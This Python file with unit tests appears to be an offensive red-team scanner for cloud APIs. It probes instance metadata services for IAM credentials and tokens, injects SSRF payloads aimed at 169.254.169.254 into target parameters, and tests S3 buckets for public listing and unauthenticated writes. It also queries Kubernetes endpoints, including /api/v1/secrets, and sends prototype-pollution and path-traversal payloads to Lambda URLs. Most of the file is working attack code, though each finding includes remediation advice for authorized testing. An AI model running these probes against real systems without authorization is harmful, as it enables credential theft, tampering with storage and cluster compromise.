"""Cloud API Scanner — detect exposed cloud management APIs and metadata services.

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.

MITRE ATT&CK:
    T1552.005  Cloud Instance Metadata API (IMDS)
    T1530      Data from Cloud Storage
    T1619      Cloud Storage Object Discovery
"""
from __future__ import annotations

import asyncio
import json
import logging
import re
import socket
import unittest
from dataclasses import dataclass, field
from typing import Any
from unittest.mock import MagicMock, patch

log = logging.getLogger("forge.cloud.api_scanner")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

IMDS_AWS_BASE = "http://169.254.169.254"
IMDS_GCP_BASE = "http://metadata.google.internal"
IMDS_AZURE_BASE = "http://169.254.169.254"
IMDS_DO_BASE = "http://169.254.169.254"

AWS_IMDS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data",
    "/latest/dynamic/instance-identity/document",
    "/latest/meta-data/hostname",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/ami-id",
    "/latest/meta-data/placement/availability-zone",
]

GCP_IMDS_PATHS = [
    "/computeMetadata/v1/",
    "/computeMetadata/v1/instance/",
    "/computeMetadata/v1/instance/service-accounts/",
    "/computeMetadata/v1/instance/service-accounts/default/token",
    "/computeMetadata/v1/project/project-id",
]

AZURE_IMDS_PATHS = [
    "/metadata/instance?api-version=2021-02-01",
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
]

K8S_API_PATHS = [
    "/api",
    "/apis",
    "/healthz",
    "/readyz",
    "/version",
    "/metrics",
    "/openapi/v2",
    "/api/v1/secrets",
    "/api/v1/namespaces",
    "/api/v1/pods",
]

SSRF_PROBES = [
    "?url=http://169.254.169.254/latest/meta-data/",
    "?redirect=http://169.254.169.254/latest/meta-data/",
    "?target=http://169.254.169.254/latest/meta-data/",
    "?endpoint=http://169.254.169.254/latest/meta-data/",
    "?callback=http://169.254.169.254/latest/meta-data/",
    "?proxy=http://169.254.169.254/latest/meta-data/",
    "?uri=http://169.254.169.254/latest/meta-data/",
    "?path=http://169.254.169.254/latest/meta-data/",
]


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class CloudFinding:
    provider: str
    service: str
    url: str
    severity: str          # CRITICAL, HIGH, MEDIUM, LOW, INFO
    title: str
    description: str
    evidence: str
    cvss: str
    mitre_ttp: str
    remediation: str
    raw_response: str = ""


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class CloudApiScanner:
    """Detect exposed cloud management APIs and metadata services."""

    def __init__(self, timeout: int = 8, max_concurrency: int = 20):
        self.timeout = timeout
        self.max_concurrency = max_concurrency
        self._findings: list[CloudFinding] = []

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def run(self, target: str) -> dict[str, Any]:
        """Main entry point — synchronous wrapper around async scan."""
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor(1) as pool:
                    future = pool.submit(asyncio.run, self._run_async(target))
                    return future.result(timeout=120)
            return loop.run_until_complete(self._run_async(target))
        except Exception as exc:
            log.error("CloudApiScanner.run error: %s", exc)
            return {"target": target, "findings": [], "error": str(exc)}

    async def _run_async(self, target: str) -> dict[str, Any]:
        host = self._normalize_host(target)
        log.info("CloudApiScanner starting scan on %s", host)

        tasks = [
            self._check_imds(host),
            self._check_s3_public(host),
            self._check_azure_storage(host),
            self._check_gcs_public(host),
            self._check_eks_api(host),
            self._check_lambda_reflection(host),
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        imds_results = results[0] if isinstance(results[0], list) else []
        s3_results   = results[1] if isinstance(results[1], list) else []
        azure_results = results[2] if isinstance(results[2], list) else []
        gcs_results  = results[3] if isinstance(results[3], list) else []
        k8s_results  = results[4] if isinstance(results[4], list) else []
        lambda_results = results[5] if isinstance(results[5], list) else []

        all_raw = imds_results + s3_results + azure_results + gcs_results + k8s_results + lambda_results
        self._emit_findings(target, imds_results, s3_results, all_raw)

        return {
            "target": target,
            "findings": [vars(f) for f in self._findings],
            "imds": imds_results,
            "s3": s3_results,
            "azure_storage": azure_results,
            "gcs": gcs_results,
            "k8s_api": k8s_results,
            "lambda": lambda_results,
            "total_findings": len(self._findings),
        }

    # ------------------------------------------------------------------
    # Provider detection
    # ------------------------------------------------------------------

    def _normalize_host(self, target: str) -> str:
        """Strip protocol prefix and trailing slashes."""
        return re.sub(r'^https?://', '', target).rstrip('/')

    def _detect_cloud_provider(self, host: str) -> str:
        """Detect cloud provider from hostname patterns."""
        h = host.lower()
        if any(k in h for k in ('amazonaws.com', 'awsstatic', 'cloudfront.net', 'aws.')):
            return "AWS"
        if any(k in h for k in ('googleapis.com', 'appspot.com', 'run.app', 'cloudfunctions.net')):
            return "GCP"
        if any(k in h for k in ('azure.com', 'azurewebsites.net', 'windows.net', 'msecnd.net')):
            return "AZURE"
        if 'digitalocean' in h or 'droplet' in h:
            return "DIGITALOCEAN"
        return "UNKNOWN"

    def _looks_like_s3_bucket(self, host: str) -> bool:
        """Heuristic: looks like an S3 bucket name."""
        h = host.lower()
        if 's3.amazonaws.com' in h or '.s3.' in h:
            return True
        # bucket names: 3-63 chars, lowercase letters, numbers, hyphens, dots
        name_part = h.split('.')[0]
        return bool(re.match(r'^[a-z0-9][a-z0-9\-]{2,62}$', name_part))

    # ------------------------------------------------------------------
    # IMDS checks
    # ------------------------------------------------------------------

    async def _check_imds(self, host: str) -> list[dict]:
        """Check AWS/GCP/Azure/DO IMDS endpoints and SSRF vectors."""
        results = []
        results.extend(await self._probe_aws_imds())
        results.extend(await self._probe_gcp_imds())
        results.extend(await self._probe_azure_imds())
        results.extend(await self._probe_do_imds())
        results.extend(await self._probe_ssrf_imds(host))
        return results

    async def _probe_aws_imds(self) -> list[dict]:
        """Probe AWS IMDS v1 (and v2 token check)."""
        results = []
        for path in AWS_IMDS_PATHS:
            url = IMDS_AWS_BASE + path
            resp = await self._http_get(url, timeout=3)
            if resp and resp.get("status") in (200, 301, 302):
                results.append({
                    "provider": "AWS",
                    "url": url,
                    "status": resp["status"],
                    "body_excerpt": resp.get("body", "")[:500],
                    "type": "imds_aws",
                    "severity": "CRITICAL" if "credentials" in path.lower() else "HIGH",
                })
        # check IMDSv2 token endpoint
        token_url = IMDS_AWS_BASE + "/latest/api/token"
        token_resp = await self._http_put(token_url, headers={
            "X-aws-ec2-metadata-token-ttl-seconds": "21600"
        }, timeout=3)
        if token_resp and token_resp.get("status") == 200:
            results.append({
                "provider": "AWS",
                "url": token_url,
                "status": 200,
                "body_excerpt": "IMDSv2 token endpoint accessible",
                "type": "imds_aws_v2",
                "severity": "INFO",
            })
        return results

    async def _probe_gcp_imds(self) -> list[dict]:
        """Probe GCP metadata server."""
        results = []
        headers = {"Metadata-Flavor": "Google"}
        for path in GCP_IMDS_PATHS:
            url = IMDS_GCP_BASE + path
            resp = await self._http_get(url, headers=headers, timeout=3)
            if resp and resp.get("status") == 200:
                results.append({
                    "provider": "GCP",
                    "url": url,
                    "status": resp["status"],
                    "body_excerpt": resp.get("body", "")[:500],
                    "type": "imds_gcp",
                    "severity": "CRITICAL" if "token" in path else "HIGH",
                })
        return results

    async def _probe_azure_imds(self) -> list[dict]:
        """Probe Azure IMDS."""
        results = []
        headers = {"Metadata": "true"}
        for path in AZURE_IMDS_PATHS:
            url = IMDS_AZURE_BASE + path
            resp = await self._http_get(url, headers=headers, timeout=3)
            if resp and resp.get("status") == 200:
                results.append({
                    "provider": "AZURE",
                    "url": url,
                    "status": resp["status"],
                    "body_excerpt": resp.get("body", "")[:500],
                    "type": "imds_azure",
                    "severity": "CRITICAL" if "token" in path else "HIGH",
                })
        return results

    async def _probe_do_imds(self) -> list[dict]:
        """Probe DigitalOcean metadata service."""
        results = []
        url = IMDS_DO_BASE + "/metadata/v1"
        resp = await self._http_get(url, timeout=3)
        if resp and resp.get("status") == 200:
            results.append({
                "provider": "DIGITALOCEAN",
                "url": url,
                "status": resp["status"],
                "body_excerpt": resp.get("body", "")[:500],
                "type": "imds_do",
                "severity": "HIGH",
            })
        return results

    async def _probe_ssrf_imds(self, host: str) -> list[dict]:
        """Try SSRF probes against target to reach IMDS."""
        results = []
        base_url = f"http://{host}"
        for probe in SSRF_PROBES:
            url = base_url + probe
            resp = await self._http_get(url, timeout=5)
            if resp and resp.get("status") == 200:
                body = resp.get("body", "")
                # Check for IMDS-like responses
                if any(indicator in body.lower() for indicator in [
                    "ami-id", "instance-id", "security-credentials",
                    "computeMetadata", "subscriptionId", "access_key"
                ]):
                    results.append({
                        "provider": "SSRF",
                        "url": url,
                        "status": resp["status"],
                        "body_excerpt": body[:500],
                        "type": "ssrf_imds",
                        "severity": "CRITICAL",
                    })
        return results

    # ------------------------------------------------------------------
    # S3 checks
    # ------------------------------------------------------------------

    async def _check_s3_public(self, host: str) -> list[dict]:
        """Check S3 bucket public access and write permissions."""
        results = []
        # extract potential bucket name
        bucket = host.split('.')[0]
        urls_to_test = [
            f"https://s3.amazonaws.com/{bucket}",
            f"https://{bucket}.s3.amazonaws.com",
            f"https://s3.amazonaws.com/{bucket}?list-type=2",
            f"https://{bucket}.s3.amazonaws.com/?list-type=2",
        ]
        for url in urls_to_test:
            # HEAD check
            head = await self._http_head(url, timeout=self.timeout)
            if head and head.get("status") in (200, 301, 307):
                results.append({
                    "provider": "AWS",
                    "service": "S3",
                    "url": url,
                    "status": head["status"],
                    "method": "HEAD",
                    "type": "s3_accessible",
                    "severity": "HIGH",
                })
            # GET check
            get_resp = await self._http_get(url, timeout=self.timeout)
            if get_resp and get_resp.get("status") == 200:
                body = get_resp.get("body", "")
                sev = "HIGH"
                if "ListBucketResult" in body or "<Key>" in body:
                    sev = "HIGH"
                    results.append({
                        "provider": "AWS",
                        "service": "S3",
                        "url": url,
                        "status": 200,
                        "method": "GET",
                        "body_excerpt": body[:1000],
                        "type": "s3_public_list",
                        "severity": sev,
                    })
            # PUT check — detect write access (empty body, just check response)
            put_resp = await self._http_put(
                f"{url.split('?')[0]}/forge-pentest-probe.txt",
                body=b"forge-probe",
                timeout=self.timeout
            )
            if put_resp and put_resp.get("status") in (200, 201, 204):
                results.append({
                    "provider": "AWS",
                    "service": "S3",
                    "url": url,
                    "status": put_resp["status"],
                    "method": "PUT",
                    "type": "s3_public_write",
                    "severity": "CRITICAL",
                })
        return results

    # ------------------------------------------------------------------
    # Azure Storage checks
    # ------------------------------------------------------------------

    async def _check_azure_storage(self, host: str) -> list[dict]:
        """Check Azure Blob Storage public access."""
        results = []
        account = host.split('.')[0]
        urls = [
            f"https://{account}.blob.core.windows.net/$web",
            f"https://{account}.blob.core.windows.net/?comp=list",
            f"https://{account}.blob.core.windows.net",
        ]
        for url in urls:
            resp = await self._http_get(url, timeout=self.timeout)
            if resp and resp.get("status") == 200:
                body = resp.get("body", "")
                sev = "HIGH"
                if "EnumerationResults" in body or "<Container>" in body:
                    sev = "HIGH"
                results.append({
                    "provider": "AZURE",
                    "service": "BlobStorage",
                    "url": url,
                    "status": 200,
                    "body_excerpt": body[:500],
                    "type": "azure_storage_public",
                    "severity": sev,
                })
        return results

    # ------------------------------------------------------------------
    # GCS checks
    # ------------------------------------------------------------------

    async def _check_gcs_public(self, host: str) -> list[dict]:
        """Check Google Cloud Storage public bucket access."""
        results = []
        bucket = host.split('.')[0]
        urls = [
            f"https://storage.googleapis.com/{bucket}",
            f"https://storage.googleapis.com/{bucket}?alt=json",
            f"https://storage.googleapis.com/storage/v1/b/{bucket}/o",
        ]
        for url in urls:
            resp = await self._http_get(url, timeout=self.timeout)
            if resp and resp.get("status") == 200:
                body = resp.get("body", "")
                results.append({
                    "provider": "GCP",
                    "service": "CloudStorage",
                    "url": url,
                    "status": 200,
                    "body_excerpt": body[:500],
                    "type": "gcs_public",
                    "severity": "HIGH",
                })
        return results

    # ------------------------------------------------------------------
    # EKS / Kubernetes API checks
    # ------------------------------------------------------------------

    async def _check_eks_api(self, host: str) -> list[dict]:
        """Check for exposed Kubernetes API server."""
        results = []
        ports = [6443, 8443, 8080, 443]
        for port in ports:
            for path in K8S_API_PATHS:
                scheme = "https" if port in (6443, 8443, 443) else "http"
                url = f"{scheme}://{host}:{port}{path}"
                resp = await self._http_get(url, timeout=4, verify_ssl=False)
                if resp and resp.get("status") in (200, 401, 403):
                    body = resp.get("body", "")
                    sev = "INFO"
                    if resp["status"] == 200 and path in ("/api", "/apis", "/version"):
                        sev = "CRITICAL"
                    elif resp["status"] in (401, 403):
                        sev = "MEDIUM"  # API exists but requires auth
                    results.append({
                        "provider": "K8S",
                        "service": "APIServer",
                        "url": url,
                        "status": resp["status"],
                        "body_excerpt": body[:300],
                        "type": "k8s_api",
                        "severity": sev,
                    })
        return results

    # ------------------------------------------------------------------
    # Lambda / API Gateway reflection
    # ------------------------------------------------------------------

    async def _check_lambda_reflection(self, host: str) -> list[dict]:
        """Test Lambda/API Gateway for prototype pollution and SSRF vectors."""
        results = []
        if '.execute-api.' not in host and 'lambda-url' not in host:
            return results

        base = f"https://{host}"
        probes = [
            ("proto_pollution", f"{base}?__proto__[polluted]=forge"),
            ("constructor_proto", f"{base}?constructor.prototype.x=forge"),
            ("path_traversal", f"{base}?functionName=../../../etc/passwd"),
            ("ssrf_imds", f"{base}?url=http://169.254.169.254/latest/meta-data/"),
        ]
        for probe_type, url in probes:
            resp = await self._http_get(url, timeout=self.timeout)
            if resp:
                body = resp.get("body", "")
                headers = resp.get("headers", {})
                if "forge" in body or "polluted" in body:
                    results.append({
                        "provider": "AWS",
                        "service": "Lambda",
                        "url": url,
                        "status": resp["status"],
                        "body_excerpt": body[:500],
                        "type": probe_type,
                        "severity": "HIGH",
                    })
        return results

    # ------------------------------------------------------------------
    # Finding emission
    # ------------------------------------------------------------------

    def _emit_findings(
        self,
        target: str,
        imds_results: list[dict],
        s3_results: list[dict],
        all_results: list[dict],
    ) -> None:
        """Convert raw results into structured CloudFinding objects."""
        # IMDS findings
        for r in imds_results:
            if r.get("type") in ("imds_aws", "imds_gcp", "imds_azure", "ssrf_imds"):
                sev = r.get("severity", "HIGH")
                if sev == "CRITICAL":
                    cvss = "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"  # 10.0
                else:
                    cvss = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"  # 7.5

                self._findings.append(CloudFinding(
                    provider=r.get("provider", "CLOUD"),
                    service="IMDS",
                    url=r["url"],
                    severity=sev,
                    title=f"Cloud Instance Metadata Service Exposed — {r.get('provider', 'Unknown')}",
                    description=(
                        "The Instance Metadata Service is accessible. Attackers can retrieve "
                        "IAM role credentials, tokens, and sensitive configuration data. "
                        f"Path: {r['url']}"
                    ),
                    evidence=r.get("body_excerpt", ""),
                    cvss=cvss,
                    mitre_ttp="T1552.005",
                    remediation=(
                        "AWS: Enforce IMDSv2 (require session tokens). "
                        "GCP: Restrict metadata access via organization policies. "
                        "Azure: Enable IMDS access control. "
                        "For all: block SSRF to 169.254.169.254 via WAF/egress filtering."
                    ),
                ))

        # S3 findings
        for r in s3_results:
            sev = r.get("severity", "HIGH")
            method = r.get("method", "GET")
            if r.get("type") == "s3_public_write":
                title = "S3 Bucket Publicly Writable"
                desc = "The S3 bucket accepts unauthenticated PUT requests. Attackers can upload malicious content, overwrite existing files, or host phishing pages."
                cvss = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"
                mitre = "T1530"
            else:
                title = "S3 Bucket Publicly Readable"
                desc = "The S3 bucket allows unauthenticated read/list access. Sensitive data may be exposed."
                cvss = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                mitre = "T1530"

            self._findings.append(CloudFinding(
                provider="AWS",
                service="S3",
                url=r["url"],
                severity=sev,
                title=title,
                description=desc,
                evidence=r.get("body_excerpt", f"HTTP {r.get('status')} via {method}"),
                cvss=cvss,
                mitre_ttp=mitre,
                remediation=(
                    "Block public access at the account level (S3 Block Public Access settings). "
                    "Use bucket policies with explicit Deny for s3:GetObject/s3:PutObject from '*'. "
                    "Enable S3 Access Analyzer to continuously monitor bucket permissions."
                ),
            ))

        # K8s unauthenticated API
        for r in all_results:
            if r.get("type") == "k8s_api" and r.get("status") == 200 and r.get("severity") == "CRITICAL":
                self._findings.append(CloudFinding(
                    provider="K8S",
                    service="API Server",
                    url=r["url"],
                    severity="CRITICAL",
                    title="Kubernetes API Server Unauthenticated Access",
                    description=(
                        "The Kubernetes API server is accessible without authentication. "
                        "An attacker can enumerate all cluster resources, execute commands in pods, "
                        "steal secrets, and achieve full cluster compromise."
                    ),
                    evidence=r.get("body_excerpt", ""),
                    cvss="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                    mitre_ttp="T1613",
                    remediation=(
                        "Enable RBAC and disable anonymous authentication (--anonymous-auth=false). "
                        "Restrict API server access to authorized networks only. "
                        "Use network policies and firewalls to block port 6443/8443 from the internet."
                    ),
                ))

    # ------------------------------------------------------------------
    # HTTP helpers (minimal async implementation)
    # ------------------------------------------------------------------

    async def _http_get(
        self,
        url: str,
        headers: dict | None = None,
        timeout: int = 8,
        verify_ssl: bool = True,
    ) -> dict | None:
        """Perform async HTTP GET. Returns dict with status/headers/body or None."""
        try:
            import aiohttp
            import ssl
            connector_kwargs: dict = {}
            if not verify_ssl:
                connector_kwargs["ssl"] = False
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    headers=headers or {},
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=True,
                    **connector_kwargs,
                ) as resp:
                    body = await resp.text(errors="replace")
                    return {
                        "status": resp.status,
                        "headers": dict(resp.headers),
                        "body": body,
                    }
        except ImportError:
            return await self._http_get_urllib(url, headers, timeout)
        except Exception as exc:
            log.debug("HTTP GET %s failed: %s", url, exc)
            return None

    async def _http_get_urllib(
        self, url: str, headers: dict | None, timeout: int
    ) -> dict | None:
        """Fallback HTTP GET using urllib."""
        try:
            import urllib.request
            import urllib.error
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(url, headers=headers or {})
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(65536).decode("utf-8", errors="replace")
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": body,
                }
        except urllib.error.HTTPError as e:
            return {"status": e.code, "headers": {}, "body": ""}
        except Exception as exc:
            log.debug("urllib GET %s failed: %s", url, exc)
            return None

    async def _http_head(
        self,
        url: str,
        headers: dict | None = None,
        timeout: int = 8,
    ) -> dict | None:
        """Perform async HTTP HEAD."""
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.head(
                    url,
                    headers=headers or {},
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=True,
                    ssl=False,
                ) as resp:
                    return {
                        "status": resp.status,
                        "headers": dict(resp.headers),
                    }
        except Exception as exc:
            log.debug("HTTP HEAD %s failed: %s", url, exc)
            return None

    async def _http_put(
        self,
        url: str,
        headers: dict | None = None,
        body: bytes = b"",
        timeout: int = 8,
    ) -> dict | None:
        """Perform async HTTP PUT."""
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.put(
                    url,
                    headers=headers or {},
                    data=body,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    ssl=False,
                ) as resp:
                    return {
                        "status": resp.status,
                        "headers": dict(resp.headers),
                        "body": await resp.text(errors="replace"),
                    }
        except Exception as exc:
            log.debug("HTTP PUT %s failed: %s", url, exc)
            return None


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestCloudApiScanner(unittest.TestCase):

    def setUp(self):
        self.scanner = CloudApiScanner(timeout=2)

    # --- Unit: host normalization ---
    def test_normalize_host_strips_https(self):
        self.assertEqual(self.scanner._normalize_host("https://example.com/"), "example.com")

    def test_normalize_host_strips_http(self):
        self.assertEqual(self.scanner._normalize_host("http://example.com"), "example.com")

    def test_normalize_host_plain(self):
        self.assertEqual(self.scanner._normalize_host("example.com"), "example.com")

    # --- Unit: cloud provider detection ---
    def test_detect_provider_aws(self):
        self.assertEqual(self.scanner._detect_cloud_provider("s3.amazonaws.com"), "AWS")

    def test_detect_provider_gcp(self):
        self.assertEqual(self.scanner._detect_cloud_provider("storage.googleapis.com"), "GCP")

    def test_detect_provider_azure(self):
        self.assertEqual(self.scanner._detect_cloud_provider("account.blob.core.windows.net"), "AZURE")

    def test_detect_provider_unknown(self):
        self.assertEqual(self.scanner._detect_cloud_provider("example.com"), "UNKNOWN")

    # --- Unit: S3 bucket detection ---
    def test_s3_bucket_detection_explicit(self):
        self.assertTrue(self.scanner._looks_like_s3_bucket("mybucket.s3.amazonaws.com"))

    def test_s3_bucket_detection_heuristic(self):
        self.assertTrue(self.scanner._looks_like_s3_bucket("my-cool-bucket"))

    def test_s3_bucket_detection_negative(self):
        self.assertFalse(self.scanner._looks_like_s3_bucket("a"))  # too short

    # --- Unit: findings emission ---
    def test_emit_findings_imds_aws(self):
        imds = [{
            "provider": "AWS",
            "url": "http://169.254.169.254/latest/meta-data/",
            "status": 200,
            "body_excerpt": "ami-id",
            "type": "imds_aws",
            "severity": "CRITICAL",
        }]
        self.scanner._emit_findings("target", imds, [], imds)
        self.assertEqual(len(self.scanner._findings), 1)
        self.assertEqual(self.scanner._findings[0].severity, "CRITICAL")
        self.assertEqual(self.scanner._findings[0].mitre_ttp, "T1552.005")

    def test_emit_findings_s3_public_read(self):
        s3 = [{
            "provider": "AWS",
            "service": "S3",
            "url": "https://bucket.s3.amazonaws.com",
            "status": 200,
            "method": "GET",
            "type": "s3_public_list",
            "severity": "HIGH",
            "body_excerpt": "<ListBucketResult>",
        }]
        scanner = CloudApiScanner()
        scanner._emit_findings("target", [], s3, s3)
        self.assertEqual(len(scanner._findings), 1)
        self.assertEqual(scanner._findings[0].service, "S3")

    def test_emit_findings_s3_public_write(self):
        s3 = [{
            "provider": "AWS",
            "service": "S3",
            "url": "https://bucket.s3.amazonaws.com/probe.txt",
            "status": 200,
            "method": "PUT",
            "type": "s3_public_write",
            "severity": "CRITICAL",
        }]
        scanner = CloudApiScanner()
        scanner._emit_findings("target", [], s3, s3)
        self.assertIn("Writable", scanner._findings[0].title)

    def test_emit_findings_k8s_unauth(self):
        k8s = [{
            "provider": "K8S",
            "service": "APIServer",
            "url": "https://target:6443/api",
            "status": 200,
            "type": "k8s_api",
            "severity": "CRITICAL",
            "body_excerpt": '{"kind":"APIVersions"}',
        }]
        scanner = CloudApiScanner()
        scanner._emit_findings("target", [], [], k8s)
        self.assertEqual(scanner._findings[0].mitre_ttp, "T1613")

    def test_aws_imds_paths_coverage(self):
        """AWS IMDS should check credentials path."""
        self.assertTrue(any("security-credentials" in p for p in AWS_IMDS_PATHS))

    def test_ssrf_probe_list_nonempty(self):
        self.assertGreater(len(SSRF_PROBES), 0)

    def test_cvss_critical_imds(self):
        """CRITICAL IMDS finding should have high-impact CVSS."""
        imds = [{
            "provider": "AWS",
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "status": 200,
            "body_excerpt": "credentials",
            "type": "imds_aws",
            "severity": "CRITICAL",
        }]
        scanner = CloudApiScanner()
        scanner._emit_findings("target", imds, [], imds)
        self.assertIn("C:H/I:H/A:H", scanner._findings[0].cvss)

    def test_scanner_instantiation(self):
        s = CloudApiScanner(timeout=5, max_concurrency=10)
        self.assertEqual(s.timeout, 5)
        self.assertEqual(s.max_concurrency, 10)

    def test_findings_list_initially_empty(self):
        self.assertEqual(len(self.scanner._findings), 0)


if __name__ == "__main__":
    unittest.main()
